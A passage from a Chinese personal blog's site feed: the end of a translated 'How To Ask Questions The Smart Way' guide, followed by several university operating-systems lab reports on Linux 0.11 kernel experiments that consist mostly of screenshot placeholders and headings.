<p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是 恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<em><strong>所有</strong></em>被怀疑的硬件作关键词仔细搜索。</p>
<blockquote>
<h6 id="问题：我怎么才能破解root帐号、窃取OP特权、读别人的邮件呢？"><a href="#问题：我怎么才能破解root帐号、窃取OP特权、读别人的邮件呢？" class="headerlink" title="问题：我怎么才能破解root帐号、窃取OP特权、读别人的邮件呢？"></a>问题：我怎么才能破解root帐号、窃取OP特权、读别人的邮件呢？</h6></blockquote>
<p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p>
<h2 id="好问题与蠢问题"><a href="#好问题与蠢问题" class="headerlink" title="好问题与蠢问题"></a>好问题与蠢问题</h2><p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢 的，另一种才是明智的。</p>
<p><em><strong>蠢问题：</strong></em></p>
<blockquote>
<p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？</p>
</blockquote>
<p>这种问法无非想得到 <a href="#page12">STFW </a>这样的回答。</p>
<p><em><strong>聪明问题：</strong></em></p>
<blockquote>
<p>我用Google搜索过 “Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这 种设备编程的资料？ </p>
</blockquote>
<p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。</p>
<p> <em><strong>蠢问题</strong></em> </p>
<blockquote>
<p>我从 foo 项目找来的源码没法编译。它怎么这么烂？ </p>
</blockquote>
<p>他觉得都是别人的错，这个傲慢自大的提问者 </p>
<p><em><strong>聪明问题</strong></em> </p>
<blockquote>
<p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问 题。这是我编译过程的记录，我有什么做的不对的地方吗？ </p>
</blockquote>
<p>提问者已经指明了环境，也读过了FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的 问题值得被关注。</p>
<p><em><strong>蠢问题</strong></em> </p>
<blockquote>
<p>我的主机板有问题了，谁来帮我？ </p>
</blockquote>
<p>某黑客对这类问题的回答通常是： <code>好的，还要帮你拍拍背和换尿布吗？</code> ，然后按下删除键。</p>
<p><em><strong>聪明问题</strong></em></p>
<blockquote>
<p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝 试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机 板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？</p>
</blockquote>
<p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。 在最后一个问题中，注意 <code>告诉我答案</code> 和 <code>给我启示，指出我还应该做什么诊断工作</code> 之间微妙而又重要的区别。</p>
<p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我 （Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员 们提供了解决这一问题的重要信息。</p>
<p>通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显 示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他 们再浪费时间，我也表明了对他们宝贵时间的尊重。</p>
<p>事后，当我向每个人表示感谢，并且讚赏这次良好的讨论经歷的时候， 一个 Linux 内核邮件列表的成员 表示，他觉得我的问题得到解决并非由于我是这个列表中的<code>名人</code>，而是因为我用了正确的方式来提问。</p>
<p>黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我<code>像</code>个乞讨者那样提 问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出 现。</p>
<h2 id="如果得不到回答"><a href="#如果得不到回答" class="headerlink" title="如果得不到回答"></a>如果得不到回答</h2><p>如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。</p>
<p>总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。</p>
<p>你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。</p>
<p>有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。</p>
<p>另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了– 完全可能如此 –你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。</p>
<p>对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开放源代码软件的要高得多，且内容也没那么丰富）。</p>
<h2 id="如何更好地回答问题"><a href="#如何更好地回答问题" class="headerlink" title="如何更好地回答问题"></a>如何更好地回答问题</h2><p><em><strong>态度和善一点。</strong></em>问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p>
<p><em><strong>对初犯者私下回复。</strong></em>对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找 常见问题都不知道。</p>
<p><em><strong>如果你不确定，一定要说出来！</strong></em>一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好 玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p>
<p><em><strong>如果帮不了忙，也别妨碍他。</strong></em>不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 –有些可怜的呆 瓜会把它当成真的指令。</p>
<p><em><strong>试探性的反问以引出更多的细节。</strong></em>如果你做得好，提问者可以学到点东西 –你也可以。试试将蠢问题转 变成好问题，别忘了我们都曾是新手。</p>
<p>尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词） 会更好。</p>
<p><em><strong>如果你决定回答，就请给出好的答案。</strong></em>当别人正在用错误的工具或方法时别建议笨拙的权宜之计 （wordaround），应推荐更好的工具，重新界定问题。</p>
<p><em><strong>正面的回答问题！</strong></em>如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但 没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都 没有。</p>
<p><em><strong>帮助你的社区从问题中学习。</strong></em>当回复一个好问题时，问问自己 <code>如何修改相关文件或常见问题文件以免再次解 答同样的问题？</code> ，接着再向文件维护者发一份补丁。</p>
<p>如果你是在研究一番后才做出的回答，<em><strong>展现你的技巧而不是直接端出结果</strong></em>。毕竟 <code>授人以鱼不如授人以渔</code> 。</p>
<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅<a class="link"   href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/" >Unix系统和网络基本原理<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>当你发布软件或补丁时，试着按<a class="link"   href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" >软件发布实践<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>操作。</p>
<h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>Evelyn Mitchel贡献了一些愚蠢问题例子并启发了编写 <code>如何更好地回答问题</code> 这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>提问的智慧</tag>
        <tag>How-to-ask</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验2——操作系统的引导</title>
    <url>/posts/68cfe7a7.html</url>
    <content><![CDATA[<h2 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf hit-oslab-linux-20110823.tar.gz \</span><br><span class="line">  -C /home/shiyanlou/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image.png"
                      alt="解压文件"
                ></p>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><ol>
<li><p>修改字符串长度</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-1.png"
                      alt="修改字符串长度"
                ></p>
</li>
<li><p>修改字符串内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-2.png"
                      alt="修改字符串内容"
                ></p>
</li>
<li><p>编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-3.png"
                      alt="编译"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-10.png"
                      alt="查看文件头"
                ></p>
</li>
<li><p>去掉文件头部</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-4.png"
                      alt="去掉文件头部"
                ></p>
</li>
<li><p>运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-5.png"
                      alt="运行"
                ></p>
</li>
<li><p>读入 setup.s</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-6.png"
                      alt="读入setup.s"
                ></p>
</li>
<li><p>再次编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-7.png"
                      alt="再次编译"
                ></p>
</li>
<li><p>注释 build.c</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-8.png"
                      alt="注释build.c"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-9.png"
                      alt="运行"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-11.png"
                      alt="运行2"
                ></p>
</li>
<li><p>显示获得的参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/2/image-12.png"
                      alt="显示获得的参数"
                ></p>
</li>
</ol>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验1——L1 什么是操作系统</title>
    <url>/posts/d77eff50.html</url>
    <content><![CDATA[<h1 id="L1-什么是操作系统"><a href="#L1-什么是操作系统" class="headerlink" title="L1 什么是操作系统"></a>L1 什么是操作系统</h1><p><span style="color:#FF0000; font-size:2.6em;">tmd 这个系统我都卡的我不想说什么了，比我吃 s 都难受</span></p>
<h2 id="实验环境的工作模式"><a href="#实验环境的工作模式" class="headerlink" title="实验环境的工作模式"></a>实验环境的工作模式</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424192200942.png"
                      alt="image-20240424192200942"
                ></p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424192501385.png"
                      alt="image-20240424192501385"
                ></p>
<h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424192833002.png"
                      alt="image-20240424192833002"
                ></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424193100258.png"
                      alt="image-20240424193100258"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424193526575.png"
                      alt="image-20240424193526575"
                ></p>
<h3 id="文件交换"><a href="#文件交换" class="headerlink" title="文件交换"></a>文件交换</h3><p><span style="color:#FF0000;">系统好卡</span></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424193809729.png"
                      alt="image-20240424193809729"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424195000047.png"
                      alt="image-20240424195000047"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/1/image-20240424195238904.png"
                      alt="image-20240424195238904"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验3——系统调用</title>
    <url>/posts/a01ebe19.html</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508192441797.png"
                      alt="image-20240508192441797"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508192749807.png"
                      alt="image-20240508192749807"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508192840004.png"
                      alt="image-20240508192840004"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508192916972.png"
                      alt="image-20240508192916972"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508192950346.png"
                      alt="image-20240508192950346"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508193053880.png"
                      alt="image-20240508193053880"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508193906467.png"
                      alt="image-20240508193906467"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508194056403.png"
                      alt="image-20240508194056403"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508201506348.png"
                      alt="image-20240508201506348"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508194447540.png"
                      alt="image-20240508194447540"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508194545466.png"
                      alt="image-20240508194545466"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/3/image-20240508195006071.png"
                      alt="image-20240508195006071"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验4——步骤进程运行轨迹的跟踪与统计</title>
    <url>/posts/806eec8c.html</url>
    <content><![CDATA[<h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515191901018.png"
                      alt="image-20240515191901018"
                ></p>
<h2 id="上传process-c"><a href="#上传process-c" class="headerlink" title="上传process.c"></a>上传process.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515192127371.png"
                      alt="image-20240515192127371"
                ></p>
<h2 id="修改main-c"><a href="#修改main-c" class="headerlink" title="修改main.c"></a>修改main.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515192246452.png"
                      alt="image-20240515192246452"
                ></p>
<h2 id="修改printk-c"><a href="#修改printk-c" class="headerlink" title="修改printk.c"></a>修改printk.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515192529577.png"
                      alt="image-20240515192529577"
                ></p>
<h2 id="修改fork-c"><a href="#修改fork-c" class="headerlink" title="修改fork.c"></a>修改fork.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515192918756.png"
                      alt="image-20240515192918756"
                ></p>
<h2 id="修改sched-c"><a href="#修改sched-c" class="headerlink" title="修改sched.c"></a>修改sched.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193112188.png"
                      alt="image-20240515193112188"
                ></p>
<h2 id="修改exit-c"><a href="#修改exit-c" class="headerlink" title="修改exit.c"></a>修改exit.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193229128.png"
                      alt="image-20240515193229128"
                ></p>
<h2 id="启动挂载"><a href="#启动挂载" class="headerlink" title="启动挂载"></a>启动挂载</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193416211.png"
                      alt="image-20240515193416211"
                ></p>
<h2 id="执行make-all"><a href="#执行make-all" class="headerlink" title="执行make all"></a>执行make all</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193504120.png"
                      alt="image-20240515193504120"
                ></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193532273.png"
                      alt="image-20240515193532273"
                ></p>
<h2 id="编译process"><a href="#编译process" class="headerlink" title="编译process"></a>编译process</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193620047.png"
                      alt="image-20240515193620047"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193841039.png"
                      alt="image-20240515193841039"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193907480.png"
                      alt="image-20240515193907480"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515193918390.png"
                      alt="image-20240515193918390"
                ></p>
<h2 id="编辑Python脚本"><a href="#编辑Python脚本" class="headerlink" title="编辑Python脚本"></a>编辑Python脚本</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515194130627.png"
                      alt="image-20240515194130627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515194207996.png"
                      alt="image-20240515194207996"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515194302505.png"
                      alt="image-20240515194302505"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/4/image-20240515194333543.png"
                      alt="image-20240515194333543"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验5——基于内核栈切换的进程切换</title>
    <url>/posts/d7e85c03.html</url>
    <content><![CDATA[<h2 id="解压环境"><a href="#解压环境" class="headerlink" title="解压环境"></a>解压环境</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190016060.png"
                      alt="image-20240522190016060"
                ></p>
<h2 id="编辑-kernel-sched-c"><a href="#编辑-kernel-sched-c" class="headerlink" title="编辑 kernel&#x2F;sched.c"></a>编辑 kernel&#x2F;sched.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190207091.png"
                      alt="image-20240522190207091"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190254789.png"
                      alt="image-20240522190254789"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190533236.png"
                      alt="image-20240522190533236"
                ></p>
<h2 id="编辑-include-linux-sched-c"><a href="#编辑-include-linux-sched-c" class="headerlink" title="编辑 include&#x2F;linux&#x2F;sched.c"></a>编辑 include&#x2F;linux&#x2F;sched.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190935509.png"
                      alt="image-20240522190935509"
                ></p>
<h2 id="编辑-kernel-system-call-s"><a href="#编辑-kernel-system-call-s" class="headerlink" title="编辑 kernel&#x2F;system_call.s"></a>编辑 kernel&#x2F;system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522191109540.png"
                      alt="image-20240522191109540"
                ></p>
<h2 id="编辑-include-linux-sched-h"><a href="#编辑-include-linux-sched-h" class="headerlink" title="编辑 include&#x2F;linux&#x2F;sched.h"></a>编辑 include&#x2F;linux&#x2F;sched.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522191346836.png"
                      alt="image-20240522191346836"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:/Users/W1ndys/AppData/Roaming/Typora/typora-user-images/image-20240522191623481.png"
                      alt="image-20240522191623481"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522191718345.png"
                      alt="image-20240522191718345"
                ></p>
<h2 id="编辑-kernel-sched-c-1"><a href="#编辑-kernel-sched-c-1" class="headerlink" title="编辑 kernel&#x2F;sched.c"></a>编辑 kernel&#x2F;sched.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522191913353.png"
                      alt="image-20240522191913353"
                ></p>
<h2 id="编辑-kernel-system-call-s-1"><a href="#编辑-kernel-system-call-s-1" class="headerlink" title="编辑 kernel&#x2F;system_call.s"></a>编辑 kernel&#x2F;system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522192100109.png"
                      alt="image-20240522192100109"
                ></p>
<h2 id="编辑-kernel-fork-c"><a href="#编辑-kernel-fork-c" class="headerlink" title="编辑 kernel&#x2F;fork.c"></a>编辑 kernel&#x2F;fork.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522192814556.png"
                      alt="image-20240522192814556"
                ></p>
<h2 id="编辑-kernel-system-call-s-2"><a href="#编辑-kernel-system-call-s-2" class="headerlink" title="编辑 kernel&#x2F;system_call.s"></a>编辑 kernel&#x2F;system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522193323667.png"
                      alt="image-20240522193323667"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522193626589.png"
                      alt="image-20240522193626589"
                ></p>
<h2 id="编辑-kernel-system-call-s-3"><a href="#编辑-kernel-system-call-s-3" class="headerlink" title="编辑 kernel&#x2F;system_call.s"></a>编辑 kernel&#x2F;system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522193812858.png"
                      alt="image-20240522193812858"
                ></p>
<h2 id="编辑-kernel-fork-c-1"><a href="#编辑-kernel-fork-c-1" class="headerlink" title="编辑 kernel&#x2F;fork.c"></a>编辑 kernel&#x2F;fork.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522193945088.png"
                      alt="image-20240522193945088"
                ></p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522194027067.png"
                      alt="image-20240522194027067"
                ></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522194107127.png"
                      alt="image-20240522194107127"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验6——信号量的实现与应用</title>
    <url>/posts/8b28bf01.html</url>
    <content><![CDATA[<h2 id="解压环境"><a href="#解压环境" class="headerlink" title="解压环境"></a>解压环境</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190016060.png"
                      alt="image-20240522190016060"
                ></p>
<h2 id="创建并编辑-pc-c"><a href="#创建并编辑-pc-c" class="headerlink" title="创建并编辑 pc.c"></a>创建并编辑 pc.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529190440451.png"
                      alt="image-20240529190440451"
                ></p>
<h2 id="创建并编辑-sem-h"><a href="#创建并编辑-sem-h" class="headerlink" title="创建并编辑 sem.h"></a>创建并编辑 sem.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529190814762.png"
                      alt="image-20240529190814762"
                ></p>
<h2 id="创建并编辑-sem-c"><a href="#创建并编辑-sem-c" class="headerlink" title="创建并编辑 sem.c"></a>创建并编辑 sem.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529190933117.png"
                      alt="image-20240529190933117"
                ></p>
<h2 id="编辑-unistd-h"><a href="#编辑-unistd-h" class="headerlink" title="编辑 unistd.h"></a>编辑 unistd.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529191046454.png"
                      alt="image-20240529191046454"
                ></p>
<h2 id="编辑-system-call-s"><a href="#编辑-system-call-s" class="headerlink" title="编辑 system_call.s"></a>编辑 system_call.s</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529191605180.png"
                      alt="image-20240529191605180"
                ></p>
<h2 id="编辑-sys-h"><a href="#编辑-sys-h" class="headerlink" title="编辑 sys.h"></a>编辑 sys.h</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529191832308.png"
                      alt="image-20240529191832308"
                ></p>
<h2 id="编辑-makefile"><a href="#编辑-makefile" class="headerlink" title="编辑 makefile"></a>编辑 makefile</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192028620.png"
                      alt="image-20240529192028620"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192102162.png"
                      alt="image-20240529192102162"
                ></p>
<h2 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h2><h3 id="cp-命令-复制操作"><a href="#cp-命令-复制操作" class="headerlink" title="cp 命令 | 复制操作"></a>cp 命令 | 复制操作</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192418439.png"
                      alt="image-20240529192418439"
                ></p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192527669.png"
                      alt="image-20240529192527669"
                ></p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192546440.png"
                      alt="image-20240529192546440"
                ></p>
<h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192643880.png"
                      alt="image-20240529192643880"
                ></p>
<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/6/image-20240529192754192.png"
                      alt="image-20240529192754192"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>操作系统</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验7——地址映射与共享</title>
    <url>/posts/8263a7da.html</url>
    <content><![CDATA[<h2 id="解压环境"><a href="#解压环境" class="headerlink" title="解压环境"></a>解压环境</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/5/image-20240522190016060.png"
                      alt="image-20240522190016060"
                ></p>
<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605190701262.png"
                      alt="image-20240605190701262"
                ></p>
<h2 id="创建-test-c"><a href="#创建-test-c" class="headerlink" title="创建 test.c"></a>创建 test.c</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191336516.png"
                      alt="image-20240605191336516"
                ></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/OS/7/image-20240605191440694.png"
                      alt="image-20240605191440694"
                ></p>
<p><img  
